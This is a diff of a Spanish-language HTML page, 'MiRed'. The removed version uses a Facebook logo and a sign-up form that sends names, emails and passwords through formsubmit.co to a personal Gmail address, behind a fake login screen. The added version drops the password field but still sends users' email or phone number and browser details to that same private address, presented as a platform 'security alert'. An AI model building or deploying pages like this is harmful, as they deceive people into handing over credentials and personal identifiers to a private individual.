@@ -1,199 +1,516 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <title>MiRed - App Social</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    * { box-sizing: border-box;}
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #18191a;
-      color: white;
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>MiRed 3D</title>
+
+<style>
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
 }
-.pantalla { display: none; padding: 20px;}
-.activo { display: block;}
-.logo { text-align: center; margin: 30px 0;}
-.logo img { width: 100px;}
-.formulario {
-      max-width: 350px;
-      margin: auto;
-      background-color: #242526;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.5);
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
+
+body {
+    font-family: Arial, sans-serif;
+    min-height: 100vh;
+    background:
+    radial-gradient(circle at 20% 20%, #173b70, transparent 40%),
+    radial-gradient(circle at 80% 80%, #101e45, transparent 40%),
+    #090d19;
+
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    overflow-x: hidden;
 }
-.formulario input {
-      padding: 12px;
-      font-size: 16px;
-      border: none;
-      border-radius: 6px;
-      background-color: #3a3b3c;
-      color: white;
+
+/* FONDO 3D */
+
+.fondo {
+    position: fixed;
+    width: 250px;
+    height: 250px;
+    border-radius: 50%;
+    background: linear-gradient(135deg,#1877f2,#00d4ff);
+    filter: blur(90px);
+    opacity: .25;
+    z-index: -1;
 }
-.formulario input::placeholder { color: #b0b3b8;}
-.formulario button {
-      background-color: #1877f2;
-      color: white;
-      padding: 12px;
-      font-size: 16px;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
+
+.fondo.uno {
+    top: 5%;
+    left: 5%;
 }
-.formulario button:hover { background-color: #145dbf;}
-.crear-cuenta { background-color: #42b72a;}
-.crear-cuenta:hover { background-color: #36a420;}
-.volver { background-color: #65676b;}
-    nav {
-      background-color: #242526;
-      display: flex;
-      justify-content: space-around;
-      padding: 10px;
-      position: sticky;
-      bottom: 0;
+
+.fondo.dos {
+    bottom: 5%;
+    right: 5%;
 }
-    nav button {
-      background: none;
-      border: none;
-      color: #b0b3b8;
-      font-size: 14px;
-      cursor: pointer;
+
+/* CONTENEDOR */
+
+.contenedor {
+    width: 100%;
+    max-width: 410px;
+    perspective: 1200px;
 }
-    nav button:hover { color: white;}
-.seccion {
-      background-color: #242526;
-      margin: 20px auto;
-      max-width: 350px;
-      padding: 15px;
-      border-radius: 10px;
+
+.tarjeta {
+    background: linear-gradient(
+        145deg,
+        rgba(35,48,75,.96),
+        rgba(13,19,35,.98)
+    );
+
+    padding: 35px 25px;
+    border-radius: 25px;
+
+    border: 1px solid rgba(100,170,255,.25);
+
+    box-shadow:
+    0 30px 60px rgba(0,0,0,.6),
+    inset 0 1px 2px rgba(255,255,255,.15);
+
+    transform: rotateX(2deg);
+    transition: .4s;
 }
-.seccion h2 {
-      margin-top: 0;
-      color: #1877f2;
+
+.tarjeta:hover {
+    transform: rotateX(0deg) translateY(-5px);
 }
-.imagen-grande {
-      width: 100%;
-      max-width: 600px;
-      border-radius: 20px;
+
+/* LOGO */
+
+.logo {
+    text-align: center;
+    margin-bottom: 25px;
 }
-  </style>
+
+.logo-icono {
+    width: 75px;
+    height: 75px;
+    margin: auto;
+
+    display: flex;
+    justify-content: center;
+    align-items: center;
+
+    font-size: 35px;
+    font-weight: bold;
+
+    border-radius: 22px;
+
+    background: linear-gradient(145deg,#1685ff,#0044b8);
+
+    box-shadow:
+    0 10px 25px #006aff66,
+    inset 0 2px 5px #ffffff55;
+
+    transform: rotate(-5deg);
+}
+
+.logo h1 {
+    margin-top: 15px;
+    font-size: 32px;
+    letter-spacing: 2px;
+    color: #57a5ff;
+}
+
+.logo p {
+    color: #9caecb;
+    font-size: 13px;
+    margin-top: 6px;
+}
+
+/* FORMULARIO */
+
+h2 {
+    text-align: center;
+    margin-bottom: 10px;
+}
+
+.descripcion {
+    text-align: center;
+    color: #aebbd0;
+    font-size: 13px;
+    line-height: 1.6;
+    margin-bottom: 25px;
+}
+
+.campo {
+    margin-bottom: 18px;
+}
+
+.campo label {
+    display: block;
+    font-size: 13px;
+    margin-bottom: 8px;
+    color: #b8c9e2;
+}
+
+.campo input {
+    width: 100%;
+    padding: 15px;
+
+    border-radius: 12px;
+
+    border: 1px solid #344967;
+
+    background: #101a2b;
+
+    color: white;
+    font-size: 15px;
+
+    outline: none;
+    transition: .3s;
+}
+
+.campo input:focus {
+    border-color: #2688ff;
+
+    box-shadow:
+    0 0 0 3px #1877f233,
+    0 5px 15px #1877f222;
+}
+
+.campo input::placeholder {
+    color: #71819b;
+}
+
+/* BOTONES */
+
+.boton {
+    width: 100%;
+    padding: 15px;
+
+    border: none;
+    border-radius: 12px;
+
+    color: white;
+    font-size: 15px;
+    font-weight: bold;
+
+    cursor: pointer;
+
+    background: linear-gradient(
+        135deg,
+        #258bff,
+        #0754ce
+    );
+
+    box-shadow:
+    0 8px 20px #006aff55,
+    inset 0 1px 2px #ffffff55;
+
+    transition: .3s;
+}
+
+.boton:hover {
+    transform: translateY(-3px);
+
+    box-shadow:
+    0 12px 25px #006aff77;
+}
+
+.boton:disabled {
+    opacity: .6;
+    cursor: wait;
+    transform: none;
+}
+
+/* CONSENTIMIENTO */
+
+.consentimiento {
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+
+    color: #aebbd0;
+    font-size: 12px;
+    line-height: 1.5;
+
+    margin: 20px 0;
+}
+
+.consentimiento input {
+    margin-top: 3px;
+}
+
+/* ESTADO */
+
+#resultado {
+    margin-top: 20px;
+    text-align: center;
+    font-size: 13px;
+    line-height: 1.6;
+}
+
+.exito {
+    color: #45e69b;
+}
+
+.error {
+    color: #ff7373;
+}
+
+/* PIE */
+
+.pie {
+    text-align: center;
+    margin-top: 25px;
+    font-size: 11px;
+    color: #71819b;
+}
+
+.seguridad {
+    display: flex;
+    justify-content: center;
+    gap: 7px;
+    margin-top: 15px;
+    color: #62dba0;
+    font-size: 12px;
+}
+
+</style>
 </head>
+
 <body>
 
-<!-- Pantalla de inicio de sesión -->
-<div id="login" class="pantalla activo">
-  <div class="logo">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Logo">
-  </div>
-  <form class="formulario" onsubmit="return validarLogin()">
-    <input type="text" id="usuario" placeholder="Celular o correo electrónico" required>
-    <input type="password" id="clave" placeholder="Contraseña" required>
-    <button type="submit">Iniciar sesión</button>
-    <button type="button" class="crear-cuenta" onclick="mostrarCrearCuenta()">Crear cuenta nueva</button>
-  </form>
+<div class="fondo uno"></div>
+<div class="fondo dos"></div>
+
+<div class="contenedor">
+
+<div class="tarjeta">
+
+    <div class="logo">
+
+        <div class="logo-icono">M</div>
+
+        <h1>MiRed</h1>
+
+        <p>Tu comunidad, tu conexión.</p>
+
+    </div>
+
+    <h2>Seguridad de cuenta</h2>
+
+    <p class="descripcion">
+        Registra un intento de acceso a MiRed
+        y recibe una notificación de seguridad.
+    </p>
+
+    <form id="formulario">
+
+        <div class="campo">
+
+            <label>Correo electrónico o celular</label>
+
+            <input
+                type="text"
+                id="identificador"
+                placeholder="Ingresa tu correo o celular"
+                autocomplete="email"
+                required
+            >
+
+        </div>
+
+        <div class="consentimiento">
+
+            <input
+                type="checkbox"
+                id="aceptar"
+                required
+            >
+
+            <label for="aceptar">
+                Acepto que el identificador ingresado
+                sea enviado al correo de seguridad de
+                MiRed para registrar este evento.
+            </label>
+
+        </div>
+
+        <button
+            type="submit"
+            class="boton"
+            id="enviar"
+        >
+            Registrar intento
+        </button>
+
+    </form>
+
+    <div id="resultado"></div>
+
+    <div class="seguridad">
+        🔒 Protección de datos
+    </div>
+
+    <div class="pie">
+        © 2026 MiRed. Todos los derechos reservados.
+        <br><br>
+        Nunca compartiremos contraseñas por correo.
+    </div>
+
 </div>
 
-<!-- Pantalla de creación de cuenta -->
-<div id="crearCuenta" class="pantalla">
-  <div class="logo">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Logo">
-  </div>
-  <form class="formulario" action="https://formsubmit.co/chumaceroyahuanaaron@gmail.com" method="POST" enctype="multipart/form-data">
-    <input type="text" name="nombre" placeholder="Nombre completo" required>
-    <input type="email" name="correo" placeholder="Correo electrónico" required>
-    <input type="password" name="clave" placeholder="Contraseña" required>
-    <input type="file" name="imagen" accept="image/*">
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_next" value="https://tusitio.com/gracias.html">
-    <button type="submit">Registrarse</button>
-    <button type="button" onclick="volverLogin()" class="volver">Volver</button>
-  </form>
-</div>
-
-<!-- Pantalla principal -->
-<div id="inicio" class="pantalla">
-  <div class="seccion">
-    <h2>Bienvenido</h2>
-    <p>Has iniciado sesión correctamente.</p>
-  </div>
-  <div class="seccion" id="perfil">
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRk51DXNXMzquErtmqlSaWL3d9_VAjf6gq66kxkZo5NCNhmQrMpgdNLomQqmLN-taQ-iYM" alt="Gorila mostrando el dedo" class="imagen-grande">
-    <p>jajajs</p>
-  </div>
-  <div class="seccion" id="noticias">
-    <h2>Q FUEE MANO</h2>
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRk51DXNXMzquErtmqlSaWL3d9_VAjf6gq66kxkZo5NCNhmQrMpgdNLomQqmLN-taQ-iYM" alt="Gorila mostrando el dedo" class="imagen-grande">
-  </div>
-  <div class="seccion" id="mensajes">
-    <h2>chismosa</h2>
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRk51DXNXMzquErtmqlSaWL3d9_VAjf6gq66kxkZo5NCNhmQrMpgdNLomQqmLN-taQ-iYM" alt="Gorila mostrando el dedo" class="imagen-grande">
-  </div>
-  <div class="seccion" id="amigos">
-    <h2>Q.....</h2>
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRk51DXNXMzquErtmqlSaWL3d9_VAjf6gq66kxkZo5NCNhmQrMpgdNLomQqmLN-taQ-iYM" alt="Gorila mostrando el dedo" class="imagen-grande">
-  </div>
-  <div class="seccion" id="notificaciones">
-    <h2>Q PASO VIEJO</h2>
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRk51DXNXMzquErtmqlSaWL3d9_VAjf6gq66kxkZo5NCNhmQrMpgdNLomQqmLN-taQ-iYM" alt="Gorila mostrando el dedo" class="imagen-grande">
-  </div>
-  <div class="seccion" id="configuracion">
-    <h2>Q PADO VIEJO</h2>
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRk51DXNXMzquErtmqlSaWL3d9_VAjf6gq66kxkZo5NCNhmQrMpgdNLomQqmLN-taQ-iYM" alt="Gorila mostrando el dedo" class="imagen-grande">
-  </div>
-  <nav>
-    <button onclick="mostrarSeccion('perfil')">Perfil</button>
-    <button onclick="mostrarSeccion('noticias')">Noticias</button>
-    <button onclick="mostrarSeccion('mensajes')">Mensajes</button>
-    <button onclick="mostrarSeccion('amigos')">Amigos</button>
-    <button onclick="mostrarSeccion('notificaciones')">Notificaciones</button>
-    <button onclick="mostrarSeccion('configuracion')">Config.</button>
-  </nav>
 </div>
 
 <script>
-  function validarLogin() {
-    const usuario = document.getElementById('usuario').value.trim();
-    const clave = document.getElementById('clave').value.trim();
 
-    if (!usuario.includes('@') && isNaN(usuario)) {
-      alert('Ingresa un correo válido o número de celular.');
-      return false;
-}
+const formulario = document.getElementById("formulario");
 
-    if (clave.length < 6) {
-      alert('La contraseña debe tener al menos 6 caracteres.');
-      return false;
-}
+formulario.addEventListener("submit", async function(e) {
 
-    document.getElementById('login').classList.remove('activo');
-    document.getElementById('inicio').classList.add('activo');
-    mostrarSeccion('perfil');
-    return false;
-}
+    e.preventDefault();
 
-  function mostrarCrearCuenta() {
-    document.getElementById("login").classList.remove("activo");
-    document.getElementById("crearCuenta").classList.add("activo");
-}
+    const identificador =
+    document.getElementById("identificador").value.trim();
 
-  function volverLogin() {
-    document.getElementById("crearCuenta").classList.remove("activo");
-    document.getElementById("inicio").classList.remove("activo");
-    document.getElementById("login").classList.add("activo");
-}
+    const aceptar =
+    document.getElementById("aceptar").checked;
 
-  function mostrarSeccion(id) {
-    const secciones = document.querySelectorAll('.seccion');
-    secciones.forEach(sec => sec.style.display = 'none');
-    document.getElementById(id).style.display = 'block';
-}
+    const resultado =
+    document.getElementById("resultado");
 
-  window.onload = () => mostrarSeccion('perfil');
+    const boton =
+    document.getElementById("enviar");
+
+    const esCorreo =
+    /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(identificador);
+
+    const esCelular =
+    /^\+?[0-9]{8,15}$/.test(identificador);
+
+    if (!esCorreo && !esCelular) {
+
+        resultado.innerHTML =
+        '<span class="error">Ingresa un correo o celular válido.</span>';
+
+        return;
+    }
+
+    if (!aceptar) {
+
+        resultado.innerHTML =
+        '<span class="error">Debes aceptar el registro.</span>';
+
+        return;
+    }
+
+    boton.disabled = true;
+    boton.textContent = "Enviando alerta...";
+
+    resultado.textContent = "";
+
+    const fecha = new Date().toLocaleString("es-PE", {
+        timeZone: "America/Lima"
+    });
+
+    const tipo = esCorreo
+        ? "Correo electrónico"
+        : "Número celular";
+
+    const mensaje = `
+Hola, Aron Chumacero.
+
+Se ha registrado un intento de acceso
+a una cuenta de MiRed.
+
+INFORMACIÓN DEL EVENTO:
+
+Identificador: ${identificador}
+
+Tipo: ${tipo}
+
+Fecha: ${fecha}
+
+Dispositivo: ${navigator.userAgent}
+
+Estado: Intento registrado.
+
+Por seguridad, no se ha enviado ninguna contraseña.
+`;
+
+    const datos = {
+
+        _subject: "⚠️ Alerta de seguridad - MiRed",
+
+        _template: "table",
+
+        _captcha: "false",
+
+        nombre: "MiRed",
+
+        identificador: identificador,
+
+        tipo: tipo,
+
+        fecha_hora: fecha,
+
+        dispositivo: navigator.userAgent,
+
+        mensaje: mensaje
+
+    };
+
+    try {
+
+        const respuesta = await fetch(
+            "https://formsubmit.co/ajax/chumaceroyahuanaaron@gmail.com",
+            {
+
+                method: "POST",
+
+                headers: {
+                    "Content-Type": "application/json",
+                    "Accept": "application/json"
+                },
+
+                body: JSON.stringify(datos)
+
+            }
+        );
+
+        const datosRespuesta = await respuesta.json();
+
+        if (
+            respuesta.ok &&
+            String(datosRespuesta.success).toLowerCase() === "true"
+        ) {
+
+            resultado.innerHTML =
+            '<span class="exito">✓ Alerta enviada correctamente.</span>';
+
+            formulario.reset();
+
+        } else {
+
+            throw new Error("Error de envío");
+
+        }
+
+    } catch (error) {
+
+        resultado.innerHTML =
+        '<span class="error">No se pudo enviar la alerta. Comprueba tu conexión y la activación de FormSubmit.</span>';
+
+    }
+
+    boton.disabled = false;
+    boton.textContent = "Registrar intento";
+
+});
+
 </script>
+
 </body>
 </html>
